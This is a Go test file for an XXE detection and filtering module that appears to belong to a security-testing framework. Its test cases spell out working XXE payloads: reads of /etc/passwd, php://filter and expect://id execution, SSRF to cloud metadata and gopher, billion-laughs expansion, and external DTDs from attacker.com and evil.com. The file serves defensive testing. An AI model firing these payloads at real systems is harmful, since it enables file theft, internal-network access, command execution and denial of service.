package modules

import (
	"encoding/base64"
	"testing"
)

// TestXXEModuleInfo tests module metadata
func TestXXEModuleInfo(t *testing.T) {
	m := &XXE{}
	info := m.Info()

	if info.Name != "xxe" {
		t.Errorf("Expected name 'xxe', got '%s'", info.Name)
	}

	if info.RequiresSink != "" {
		t.Errorf("Expected empty RequiresSink, got '%s'", info.RequiresSink)
	}

	// Check supported placements
	expectedPlacements := []string{"query_param", "form_field", "json_field", "header", "cookie"}
	if len(info.SupportedPlacements) != len(expectedPlacements) {
		t.Errorf("Expected %d placements, got %d", len(expectedPlacements), len(info.SupportedPlacements))
	}

	placementMap := make(map[string]bool)
	for _, p := range info.SupportedPlacements {
		placementMap[p] = true
	}

	for _, expected := range expectedPlacements {
		if !placementMap[expected] {
			t.Errorf("Expected placement '%s' not found", expected)
		}
	}
}

// TestXXEModuleRegistered tests that module is registered
func TestXXEModuleRegistered(t *testing.T) {
	if !Has("xxe") {
		t.Error("xxe module should be registered")
	}

	module, err := Get("xxe")
	if err != nil {
		t.Errorf("Failed to get module: %v", err)
	}

	if module == nil {
		t.Error("Module should not be nil")
	}
}

// TestIsXML tests XML detection
func TestIsXML(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "XML declaration",
			input:    `<?xml version="1.0"?><root></root>`,
			expected: true,
		},
		{
			name:     "DOCTYPE",
			input:    `<!DOCTYPE root><root></root>`,
			expected: true,
		},
		{
			name:     "Simple element",
			input:    `<root><child>value</child></root>`,
			expected: true,
		},
		{
			name:     "Plain text",
			input:    `just plain text`,
			expected: false,
		},
		{
			name:     "JSON",
			input:    `{"key": "value"}`,
			expected: false,
		},
		{
			name:     "Empty string",
			input:    ``,
			expected: false,
		},
		{
			name:     "Whitespace then XML",
			input:    `  <?xml version="1.0"?><root/>`,
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isXML(tt.input)
			if result != tt.expected {
				t.Errorf("isXML(%q) = %v, expected %v", tt.input, result, tt.expected)
			}
		})
	}
}

// TestDetectProtocol tests protocol detection from URIs
func TestDetectProtocol(t *testing.T) {
	tests := []struct {
		uri      string
		expected string
	}{
		{"file:///etc/passwd", "file"},
		{"http://localhost/", "http"},
		{"https://example.com/", "https"},
		{"ftp://server/file", "ftp"},
		{"php://filter/convert.base64-encode/resource=/etc/passwd", "php"},
		{"expect://id", "expect"},
		{"gopher://localhost:25/", "gopher"},
		{"jar:file:///test.jar!/file", "jar:file"},
		{"netdoc://localhost/file", "netdoc"},
		{"data://text/plain;base64,SGVsbG8=", "data"},
		{"/etc/passwd", "unknown"},
		{"", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.uri, func(t *testing.T) {
			result := detectProtocol(tt.uri)
			if result != tt.expected {
				t.Errorf("detectProtocol(%q) = %q, expected %q", tt.uri, result, tt.expected)
			}
		})
	}
}

// TestIsEntityDangerous tests dangerous entity detection
func TestIsEntityDangerous(t *testing.T) {
	tests := []struct {
		name         string
		entity       ExternalEntityInfo
		expectDanger bool
		expectReason bool
	}{
		{
			name:         "File protocol",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "file:///etc/passwd", Protocol: "file"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "PHP filter",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "php://filter/convert.base64-encode/resource=/etc/passwd", Protocol: "php"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "Expect protocol",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "expect://id", Protocol: "expect"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "HTTP to localhost",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "http://localhost/internal", Protocol: "http"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "HTTP to 127.0.0.1",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "http://127.0.0.1/", Protocol: "http"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "HTTP to external",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "http://example.com/", Protocol: "http"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "Gopher protocol",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "gopher://localhost:25/", Protocol: "gopher"},
			expectDanger: true,
			expectReason: true,
		},
		{
			name:         "FTP protocol",
			entity:       ExternalEntityInfo{Name: "xxe", URI: "ftp://server/file", Protocol: "ftp"},
			expectDanger: true,
			expectReason: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dangerous, reason := isEntityDangerous(tt.entity)
			if dangerous != tt.expectDanger {
				t.Errorf("Expected dangerous=%v, got %v", tt.expectDanger, dangerous)
			}
			if tt.expectReason && reason == "" {
				t.Error("Expected a reason but got empty string")
			}
		})
	}
}

// TestDetectDOCTYPEEntities tests DOCTYPE and entity detection
func TestDetectDOCTYPEEntities(t *testing.T) {
	tests := []struct {
		name              string
		xml               string
		expectRootElement string
		expectEntities    int
		expectExploitable bool
	}{
		{
			name: "Simple XXE with file protocol",
			xml: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
			expectRootElement: "foo",
			expectEntities:    1,
			expectExploitable: true,
		},
		{
			name: "Multiple entities",
			xml: `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file1 SYSTEM "file:///etc/passwd">
  <!ENTITY file2 SYSTEM "file:///etc/hosts">
]>
<data>&file1;&file2;</data>`,
			expectRootElement: "data",
			expectEntities:    2,
			expectExploitable: true,
		},
		{
			name: "Parameter entity",
			xml: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<foo>test</foo>`,
			expectRootElement: "foo",
			expectEntities:    1,
			expectExploitable: true,
		},
		{
			name: "Internal entity only",
			xml: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY greeting "Hello World">
]>
<foo>&greeting;</foo>`,
			expectRootElement: "foo",
			expectEntities:    1,
			expectExploitable: false,
		},
		{
			name:              "No DOCTYPE",
			xml:               `<foo>bar</foo>`,
			expectRootElement: "",
			expectEntities:    0,
			expectExploitable: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := &XXEResult{
				DetectedEntities: []string{},
				ExternalEntities: []ExternalEntityInfo{},
			}
			detectDOCTYPEEntities(result, tt.xml)

			if result.RootElement != tt.expectRootElement {
				t.Errorf("Expected root element '%s', got '%s'", tt.expectRootElement, result.RootElement)
			}

			if len(result.DetectedEntities) != tt.expectEntities {
				t.Errorf("Expected %d entities, got %d", tt.expectEntities, len(result.DetectedEntities))
			}

			if result.Exploitable != tt.expectExploitable {
				t.Errorf("Expected exploitable=%v, got %v", tt.expectExploitable, result.Exploitable)
			}
		})
	}
}

// TestDetectExternalEntities tests detection of external entity patterns
func TestDetectExternalEntities(t *testing.T) {
	tests := []struct {
		name              string
		xml               string
		expectPatterns    []string
		expectExploitable bool
	}{
		{
			name:              "File protocol",
			xml:               `<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
			expectPatterns:    []string{"file_protocol"},
			expectExploitable: true,
		},
		{
			name:              "PHP filter",
			xml:               `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`,
			expectPatterns:    []string{"php_filter"},
			expectExploitable: true,
		},
		{
			name:              "HTTP SSRF",
			xml:               `<!ENTITY xxe SYSTEM "http://localhost/internal">`,
			expectPatterns:    []string{"http_ssrf"},
			expectExploitable: true,
		},
		{
			name:              "Expect RCE",
			xml:               `<!ENTITY xxe SYSTEM "expect://id">`,
			expectPatterns:    []string{"php_expect"},
			expectExploitable: true,
		},
		{
			name:              "Gopher SSRF",
			xml:               `<!ENTITY xxe SYSTEM "gopher://localhost:25/">`,
			expectPatterns:    []string{"gopher_protocol"},
			expectExploitable: true,
		},
		{
			name:              "Billion laughs pattern",
			xml:               `<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">`,
			expectPatterns:    []string{"entity_expansion"},
			expectExploitable: true,
		},
		{
			name:              "Parameter entity",
			xml:               `<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">`,
			expectPatterns:    []string{"parameter_entity", "http_ssrf"},
			expectExploitable: true,
		},
		{
			name:              "Safe XML",
			xml:               `<root><child>value</child></root>`,
			expectPatterns:    []string{},
			expectExploitable: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := &XXEResult{
				ExternalEntities: []ExternalEntityInfo{},
			}
			detectExternalEntities(result, tt.xml)

			if result.Exploitable != tt.expectExploitable {
				t.Errorf("Expected exploitable=%v, got %v", tt.expectExploitable, result.Exploitable)
			}

			// Check that expected patterns are detected
			detectedPatterns := make(map[string]bool)
			for _, entity := range result.ExternalEntities {
				detectedPatterns[entity.Name] = true
			}

			for _, expected := range tt.expectPatterns {
				if !detectedPatterns[expected] {
					t.Errorf("Expected pattern '%s' not detected. Detected: %v", expected, result.ExternalEntities)
				}
			}
		})
	}
}

// TestDetermineAttackType tests attack type determination
func TestDetermineAttackType(t *testing.T) {
	tests := []struct {
		name         string
		entities     []ExternalEntityInfo
		expectedType string
	}{
		{
			name: "File disclosure",
			entities: []ExternalEntityInfo{
				{Name: "xxe", Protocol: "file", URI: "file:///etc/passwd", Dangerous: true},
			},
			expectedType: "file_disclosure",
		},
		{
			name: "PHP filter file read",
			entities: []ExternalEntityInfo{
				{Name: "xxe", Protocol: "php", URI: "php://filter/convert.base64-encode/resource=/etc/passwd", Dangerous: true},
			},
			expectedType: "file_disclosure",
		},
		{
			name: "Remote code execution",
			entities: []ExternalEntityInfo{
				{Name: "xxe", Protocol: "expect", URI: "expect://id", Dangerous: true},
			},
			expectedType: "remote_code_execution",
		},
		{
			name: "SSRF",
			entities: []ExternalEntityInfo{
				{Name: "xxe", Protocol: "http", URI: "http://internal/", Dangerous: true},
			},
			expectedType: "ssrf",
		},
		{
			name: "Denial of service",
			entities: []ExternalEntityInfo{
				{Name: "entity_expansion", Type: "DOS", Dangerous: true},
			},
			expectedType: "denial_of_service",
		},
		{
			name: "Blind XXE",
			entities: []ExternalEntityInfo{
				{Name: "param", Type: "PARAMETER", Dangerous: true},
			},
			expectedType: "blind_xxe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := &XXEResult{
				Exploitable:      true,
				ExternalEntities: tt.entities,
			}
			determineAttackType(result)

			if result.AttackType != tt.expectedType {
				t.Errorf("Expected attack type '%s', got '%s'", tt.expectedType, result.AttackType)
			}
		})
	}
}

// TestApplyXXEFilter tests XXE filtering
func TestApplyXXEFilter(t *testing.T) {
	tests := []struct {
		name          string
		input         string
		filter        string
		expectBlocked bool
	}{
		{
			name:          "No filter allows DOCTYPE",
			input:         `<!DOCTYPE foo><foo/>`,
			filter:        "none",
			expectBlocked: false,
		},
		{
			name:          "Basic doctype filter blocks DOCTYPE",
			input:         `<!DOCTYPE foo><foo/>`,
			filter:        "basic_doctype",
			expectBlocked: true,
		},
		{
			name:          "Basic doctype filter allows clean XML",
			input:         `<foo>bar</foo>`,
			filter:        "basic_doctype",
			expectBlocked: false,
		},
		{
			name:          "Basic entity filter blocks ENTITY",
			input:         `<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
			filter:        "basic_entity",
			expectBlocked: true,
		},
		{
			name:          "External entities filter blocks file://",
			input:         `<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
			filter:        "external_entities",
			expectBlocked: true,
		},
		{
			name:          "External entities filter blocks http://",
			input:         `<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">`,
			filter:        "external_entities",
			expectBlocked: true,
		},
		{
			name:          "External entities filter blocks php://",
			input:         `<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">`,
			filter:        "external_entities",
			expectBlocked: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, _ := applyXXEFilter(tt.input, tt.filter, nil)
			if blocked != tt.expectBlocked {
				t.Errorf("Expected blocked=%v, got %v", tt.expectBlocked, blocked)
			}
		})
	}
}

// TestProcessXMLPayload tests full XML payload processing
func TestProcessXMLPayload(t *testing.T) {
	tests := []struct {
		name              string
		input             string
		expectParsed      bool
		expectExploitable bool
		expectAttackType  string
	}{
		{
			name: "Classic XXE file read",
			input: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
			expectParsed:      true,
			expectExploitable: true,
			expectAttackType:  "file_disclosure",
		},
		{
			name: "Blind XXE with parameter entity",
			input: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>test</foo>`,
			expectParsed:      true,
			expectExploitable: true,
			expectAttackType:  "blind_xxe",
		},
		{
			name: "SSRF via XXE",
			input: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,
			expectParsed:      true,
			expectExploitable: true,
			expectAttackType:  "ssrf",
		},
		{
			name:              "Safe XML",
			input:             `<root><child>value</child></root>`,
			expectParsed:      true,
			expectExploitable: false,
			expectAttackType:  "",
		},
		{
			name:              "Invalid input",
			input:             `not xml at all`,
			expectParsed:      false,
			expectExploitable: false,
			expectAttackType:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := processXMLPayload(tt.input, true, true, false, 10, nil)

			if result.Parsed != tt.expectParsed {
				t.Errorf("Expected Parsed=%v, got %v", tt.expectParsed, result.Parsed)
			}

			if result.Exploitable != tt.expectExploitable {
				t.Errorf("Expected Exploitable=%v, got %v", tt.expectExploitable, result.Exploitable)
			}

			if result.AttackType != tt.expectAttackType {
				t.Errorf("Expected AttackType='%s', got '%s'", tt.expectAttackType, result.AttackType)
			}
		})
	}
}

// TestXXEHandleWithContext tests the Handle method with a context
func TestXXEHandleWithContext(t *testing.T) {
	m := &XXE{}

	tests := []struct {
		name              string
		input             string
		config            map[string]interface{}
		expectExploitable bool
		expectBlocked     bool
	}{
		{
			name: "XXE with no filter",
			input: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
			config:            map[string]interface{}{"filter": "none"},
			expectExploitable: true,
			expectBlocked:     false,
		},
		{
			name: "XXE blocked by filter",
			input: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
			config:            map[string]interface{}{"filter": "external_entities"},
			expectExploitable: false,
			expectBlocked:     true,
		},
		{
			name:              "Clean XML",
			input:             `<user><name>test</name></user>`,
			config:            map[string]interface{}{"filter": "none"},
			expectExploitable: false,
			expectBlocked:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &HandlerContext{
				Input:  tt.input,
				Config: tt.config,
			}

			result, err := m.Handle(ctx)
			if err != nil {
				t.Fatalf("Handle returned error: %v", err)
			}

			if result == nil || result.Data == nil {
				t.Fatal("Expected result with data")
			}

			data, ok := result.Data.(map[string]interface{})
			if !ok {
				// Try XXEResult
				if xxeResult, ok := result.Data.(*XXEResult); ok {
					if xxeResult.Exploitable != tt.expectExploitable {
						t.Errorf("Expected Exploitable=%v, got %v", tt.expectExploitable, xxeResult.Exploitable)
					}
					return
				}
				t.Fatalf("Unexpected result type: %T", result.Data)
			}

			if tt.expectBlocked {
				if blocked, ok := data["blocked"].(bool); !ok || !blocked {
					t.Error("Expected request to be blocked")
				}
			}
		})
	}
}

// TestXXEBase64Decoding tests base64 encoded XML payloads
func TestXXEBase64Decoding(t *testing.T) {
	// Create base64 encoded XXE payload
	payload := `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))

	result := processXMLPayload(encoded, true, true, false, 10, nil)

	if result.Decoded == "" {
		t.Error("Expected decoded content to be set")
	}

	if !result.Exploitable {
		t.Error("Expected base64 decoded XXE to be exploitable")
	}
}

// TestSimulateFileRead tests file read simulation
func TestSimulateFileRead(t *testing.T) {
	tests := []struct {
		path          string
		expectContent bool
	}{
		{"etc/passwd", true},
		{"/etc/passwd", true},
		{"file:///etc/passwd", false}, // Path should be cleaned first
		{"etc/hosts", true},
		{"windows/win.ini", true},
		{".htaccess", true},
		{"nonexistent/file.txt", true}, // Returns "not found" message
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			content := simulateFileRead(tt.path, false, nil)
			if tt.expectContent && content == "" {
				t.Errorf("Expected content for path '%s'", tt.path)
			}
		})
	}
}

// TestParseXMLStructure tests XML structure parsing
func TestParseXMLStructure(t *testing.T) {
	xml := `<?xml version="1.0"?>
<root attr1="value1">
  <child attr2="value2">content</child>
  <another>more</another>
</root>`

	result := &XXEResult{}
	parseXMLStructure(result, xml)

	if result.RootElement != "root" {
		t.Errorf("Expected root element 'root', got '%s'", result.RootElement)
	}

	if len(result.Elements) != 3 {
		t.Errorf("Expected 3 elements, got %d", len(result.Elements))
	}

	// Check attributes
	if result.Attributes["root.attr1"] != "value1" {
		t.Errorf("Expected attribute root.attr1='value1', got '%s'", result.Attributes["root.attr1"])
	}
}

// TestBillionLaughsDetection tests detection of entity expansion attacks
func TestBillionLaughsDetection(t *testing.T) {
	// Billion laughs (entity expansion) attack
	payload := `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`

	result := processXMLPayload(payload, true, false, false, 10, nil)

	if !result.Exploitable {
		t.Error("Expected billion laughs attack to be detected as exploitable")
	}

	// Check for DOS detection
	hasDoS := false
	for _, entity := range result.ExternalEntities {
		if entity.Type == "DOS" {
			hasDoS = true
			break
		}
	}
	if !hasDoS {
		t.Error("Expected DOS attack type to be detected")
	}
}

// TestXXEPayloadVariants tests various XXE payload variants
func TestXXEPayloadVariants(t *testing.T) {
	payloads := []struct {
		name     string
		payload  string
		expected string
	}{
		{
			name:     "Classic file read",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			expected: "file_disclosure",
		},
		{
			name:     "PHP filter base64",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
			expected: "file_disclosure",
		},
		{
			name:     "Expect RCE",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
			expected: "remote_code_execution",
		},
		{
			name:     "HTTP SSRF",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>`,
			expected: "ssrf",
		},
		{
			name:     "Gopher SSRF",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:25/">]><foo>&xxe;</foo>`,
			expected: "ssrf",
		},
		{
			name:     "FTP OOB",
			payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]><foo>&xxe;</foo>`,
			expected: "file_disclosure",
		},
	}

	for _, tt := range payloads {
		t.Run(tt.name, func(t *testing.T) {
			result := processXMLPayload(tt.payload, false, false, false, 10, nil)

			if !result.Exploitable {
				t.Errorf("Expected payload to be exploitable")
			}

			if result.AttackType != tt.expected {
				t.Errorf("Expected attack type '%s', got '%s'", tt.expected, result.AttackType)
			}
		})
	}
}
